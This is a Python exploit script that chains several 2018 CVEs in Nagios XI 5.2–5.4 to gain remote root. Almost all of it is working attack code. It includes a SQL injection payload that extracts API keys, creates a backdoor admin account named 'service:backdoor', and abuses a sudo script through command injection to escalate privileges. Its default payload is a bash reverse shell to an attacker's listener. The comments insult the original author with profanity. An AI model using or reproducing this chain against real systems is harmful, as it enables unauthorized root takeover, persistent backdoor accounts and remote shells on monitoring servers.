import requests
import sys
import random
import re
from optparse import OptionParser

# Print some helpful words:
"""
Whoever wrote the original code, you fucking suck.
"""
print("""
###############################################################################
Nagois XI 5.2.[6-9], 5.3, 5.4 Chained Remote Root
This exploit leverages the vulnerabilities enumerated in these CVES:
[ CVE-2018-8733, CVE-2018-8734, CVE-2018-8735, CVE-2018-8736 ]

More details here:
http://blog.redactedsec.net/exploits/2018/04/26/nagios.html

Steps are as follows:

0. Determine Version
1. Change the database user to root:nagiosxi
2. Get an API key with SQLi
3. Use the API Key to add an administrative user
4. Login as that administrative user
5. Do some authenticated RCE with privesc
6. Cleanup.
###############################################################################
""")
#
# Misc Functions That I Dared Not Touch
#
def parse_apikeys(resp):
    begin_delim = 'START_API:'
    end_delim = ':END_API'

    start_indecies = [m.start() for m in re.finditer(begin_delim, resp)]
    end_indecies = [m.start() for m in re.finditer(end_delim, resp)]

    unique_keys = []

    for i, index in enumerate(start_indecies):
        start_index = index + len(begin_delim)
        end_index = end_indecies[i]
        key = resp[start_index:end_index]
        if not key in unique_keys:
            unique_keys.append(key)

    return unique_keys
def parse_nsp_str(resp):
    begin_delim = 'var nsp_str = "'
    end_delim = '";\n'

    start_index = resp.find(begin_delim) + len(begin_delim)
    resp = resp[start_index:]
    end_index = resp.find(end_delim)

    return resp[:end_index]
def parse_cmd_id(resp, cmdname):
    begin_delim = "'"
    end_delim = "', '{0}')\"><img src='images/cross.png' alt='Delete'>".format(cmdname)
    end_idx = resp.find(end_delim)
    resp = resp[:end_idx]
    resp = resp[resp.rfind(begin_delim) + 1:]
    return resp
def parse_cookie(resp):
    resp = str(resp)
    begin_delim = 'Set-Cookie: nagiosxi='
    end_delim = ';'

    # find the last instance of the nagiosxi cookie...
    start_index = resp.rfind(begin_delim) + len(begin_delim)
    resp = resp[start_index:]
    end_index = resp.find(end_delim)

    return resp[:end_index]
def parse_version(resp):
    resp = str(resp)
    begin_delim = 'name="version" value="'
    end_delim = '"'

    start_index = resp.rfind(begin_delim) + len(begin_delim)
    resp = resp[start_index:]
    end_index = resp.find(end_delim)

    return resp[:end_index]
def change_db_user(username, password, step, RHOST):
    # Request Components
    parameter = '/nagiosql/admin/settings.php'
    db_headers = {'Host': RHOST,
               'Content-Type': 'application/x-www-form-urlencoded'}
    params = {
        'txtRootPath': 'nagiosql',
        'txtBasePath': '/var/www/html/nagiosql/',
        'selProtocol': 'http',
        'txtTempdir': '/tmp',
        'selLanguage': 'en_GB',
        'txtEncoding': 'utf-8',
        'txtDBserver': 'localhost',
        'txtDBport': 3306,
        'txtDBname': 'nagiosql',
        'txtDBuser': username,
        'txtDBpass': password,
        'txtLogoff': 3600,
        'txtLines': 15,
        'selSeldisable': 1
    }
    print(f"[+] STEP {step}: Setting Nagios QL DB user to {username}.")
    print(f"[+] STEP {step}: http://{RHOST}{parameter}")
    # Request
    db_response = requests.post(f"http://{RHOST}{parameter}", headers=db_headers, data=params)
    return db_response
#
# Exploit chain
#
def get_nagios_version(RHOST):
    parameter = '/nagiosxi/login.php'
    version_headers = {'Host': RHOST, 'Content-Type': 'application/x-www-form-urlencoded'}

    print("[+] STEP 0: Get Nagios XI version string.")
    print(f"[+] STEP 0: http://{RHOST}{parameter}")

    version_response = requests.post(f'http://{RHOST}{parameter}', version_headers)
    if version_response.status_code == 200:
        version = parse_version(version_response.text)
        ver_int = int(version.split('.')[1])
        print(f"[+] STEP 0: Nagios XI verions is: {version}")
        return ver_int
    else:
        print(f"[+] STEP 0: While attempting to get the version, the server returned a {version_response.status_code}")
        exit()
def change_user(RHOST):
    db_response = change_db_user('root', 'nagiosxi', '1', RHOST)
    if db_response.status_code == 302:
        print("[+] STEP 1: Received a 302 Response. That's good!")
    else:
        print(f"[!] STEP 1: Received a {db_response.status_code} Response. That's bad.")
        exit()
def get_api_keys(RHOST, version_int):
    # Request Data:
    parameter = '/nagiosql/admin/helpedit.php'
    api_headers = {'Host': RHOST, 'Content-Type': 'application/x-www-form-urlencoded'}
    # Versions of NagiosXI < 5.3.0 use 'backend_ticket', not 'api_key'.
    injection_parameter = "api_key" if (version_int >= 3) else "backend_ticket"
    params = {
        'selInfoKey1': f'c\'UNION SELECT CONCAT(\'START_API:\',{injection_parameter},\':END_API\') FROM nagiosxi.xi_users-- ',
        'hidKey1': 'common',
        'selInfoKey2': 'free_variables_name',
        'hidKey2': '',
        'selInfoVersion': '',
        'hidVersion': '',
        'taContent': '',
        'modus': 0,
        '': ''
    }
    # Request:
    print("[+] STEP 2: Exploiting SQLi to extract user API keys.")
    print(f"[+] STEP 2: http://{RHOST}{parameter}")
    sqli_response = requests.post(f"http://{RHOST}{parameter}", headers=api_headers, data=params)
    if sqli_response.status_code == 302:
        print("[+] STEP 2: Received a 302 Response. That's good!")
    else:
        print(f"[!] STEP 2: Received a {sqli_response.status_code} Response. That's bad.")
        exit()
    # API Key Work:
    api_keys = parse_apikeys(sqli_response.text)
    random.shuffle(api_keys)
    if len(api_keys) > 0:
        print(f"[+] Found {len(api_keys)} unique API keys. Cool:")
        for key in api_keys:
            print(f"[+] {key}")
    else:
        print("[!] No API keys found! Oh no. Exiting...")
        exit()
    return api_keys
def add_admin_user(RHOST, api_keys):
    header = {'Host': RHOST, 'Content-Type': 'application/x-www-form-urlencoded'}

    # I left this in here because I feel like it says a lot about the original author
    """
    # Generate the sketchiest username possibe :D
    sploit_username = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(16))
    # And also the worlds best password
    sploit_password = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(16))
    """

    params = {
        'username': 'service',
        'password': 'backdoor',
        'name': 'Billothy Gates',
        'email': 'service@localhost',
        'auth_level': 'admin',
        'force_pw_change': 0
    }

    print("[+] STEP 3: Using API Keys to add an administrative user...")
    for key in api_keys:
        parameter = f'/nagiosxi/api/v1/system/user?apikey={key}&pretty=1'
        print(f"[+] STEP 3: http://{RHOST}{parameter}")
        admin_response = requests.post(f'http://{RHOST}{parameter}', headers=header, data=params)
        if admin_response.status_code == 200 and "was added successfully" in admin_response.text:
            print("[+] STEP 3: Administrator account added successfully with credentials: service:backdoor")
        else:
            print("[!] STEP 3: API_KEY access was denied. That's bad.")
            if admin_response.status_code != 200:
                print(f"[!] Step 3: Warning: {admin_response.status_code} received")
def login_as_admin(RHOST):
    #
    # Get NSP
    #
    print("[+] STEP 4.1: Get NSP for login...")
    login_response = requests.post(f'http://{RHOST}/nagiosxi/login.php', headers={'Host': RHOST})
    login_nsp = parse_nsp_str(login_response.text)
    login_nagiosxi = parse_cookie(login_response.reason)
    print(f"[+] STEP 4.1: login_nsp = {login_nsp}")
    print(f"[+] STEP 4.1: login_nagiosxi = {login_nagiosxi}")
    #
    # Authentication
    #
    print("[+] STEP 4.2: Authenticating...")
    auth_headers = {'Host': RHOST,
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'Cookie': f'nagiosxi={login_nagiosxi}'}
    auth_params = {
        'nsp': login_nsp,
        'page': 'auth',
        'debug': '',
        'pageopt': 'login',
        'username': 'service',
        'password': 'backdoor',
        'loginButton': '',
    }
    auth_response = requests.post(f"http://{RHOST}/nagiosxi/login.php", headers=auth_headers, params=auth_params)
    authed_cookie = parse_cookie(auth_response.reason)
    print(f"[+] STEP 4.2: Authenticated Cookie = {authed_cookie}")
    #
    # 4.3 : Getting an authenticated token
    #
    print("[+] STEP 4.3: Getting an authed nsp token...")
    token_headers = {'Host': RHOST,
                  'Content-Type': 'application/x-www-form-urlencoded',
                  'Cookie': f'nagiosxi={authed_cookie}'}
    auth_token_response = requests.post(f'http://{RHOST}/nagiosxi/index.php', headers=token_headers)
    authed_nsp = parse_nsp_str(auth_token_response.text)
    print(f"[+] STEP 4.3: authed_nsp = {authed_nsp}")
    return authed_cookie
def command_execution(RHOST, command, cookie):
    print("[+] STEP 5: Executing command as root!...")
    command_headers = {'Host': RHOST,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': f'nagiosxi={cookie}'}

    command_list = ['cp /usr/local/nagiosxi/scripts/reset_config_perms.sh /usr/local/nagiosxi/scripts/reset_config_perms.sh.bak',
                  f'echo "{command}" > /usr/local/nagiosxi/scripts/reset_config_perms.sh',
                  f'sudo /usr/local/nagiosxi/scripts/reset_config_perms.sh',
                  f'mv /usr/local/nagiosxi/scripts/reset_config_perms.sh.bak /usr/local/nagiosxi/scripts/reset_config_perms.sh']
    privesc_cmd = f"$({' && '.join(command_list)})"

    command_params = {
        'cmd': 'submitcommand',
        'command': '1111',
        'command_data': privesc_cmd
    }
    command_response = requests.post(f'http://{RHOST}/nagiosxi/backend/index.php?',
                                     headers=command_headers, params=command_params)
    if command_response.status_code == 200:
        print("[+] STEP 5: Received a 200 Response. That's good!")
    else:
        print(f"[!] STEP 5: Received a {command_response.status_code} Response. That's bad.")
        exit()

    print("[+] STEP 5: Command run, proceeding to cleanup")
def cleanup(RHOST):
    print("[+] STEP 6: Cleanup")

    cleanup_response = change_db_user('nagiosql', 'n@gweb', '6', RHOST)

    if cleanup_response.status_code == 302:
        print("[+] STEP 6: Received a 302 Response. Exploit chain finished.")
    else:
        print(f"[!] STEP 6: Received a {cleanup_response.status_code} Response. That's bad.")
        exit()
#
# Main and Args
#
def args():
    usage = "Usage: %prog -r <appliance_ip> -l <listener_ip> -p <listener_port>\n" \
            "       %prog -r <appliance_ip> -c 'touch /tmp/foooooooooooo'"

    parser = OptionParser(usage=usage)
    parser.add_option("-r", '--RHOST', dest='rhost', action="store",
                      help="Target Nagios XI host")
    parser.add_option("-l", '--LHOST', dest='lhost', action="store",
                      help="Host listening for reverse shell connection")
    parser.add_option("-p", '--LPORT', dest='lport', action="store",
                      help="Port on which nc is listening")
    parser.add_option("-c", '--cmd', dest='cmd', action="store",
                      help="Run a custom command, no reverse shell for you.")

    (options, args) = parser.parse_args()

    if not options.rhost:
        parser.error("[!] No remote host specified.\n")
        parser.print_help()
        sys.exit(1)

    RHOST = options.rhost
    LHOST = options.lhost
    LPORT = options.lport
    if options.cmd:
        cmd = options.cmd
    else:
        cmd = f'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1 &'
    return RHOST, cmd
def main(RHOST, command):
    change_user(RHOST)
    api_keys = get_api_keys(RHOST, get_nagios_version(RHOST))
    add_admin_user(RHOST, api_keys)
    authenticated_cookie = login_as_admin(RHOST)
    command_execution(RHOST, command, authenticated_cookie)
    cleanup(RHOST)
if __name__ == '__main__':
    rhost, cmd = args()
    main(rhost, cmd)
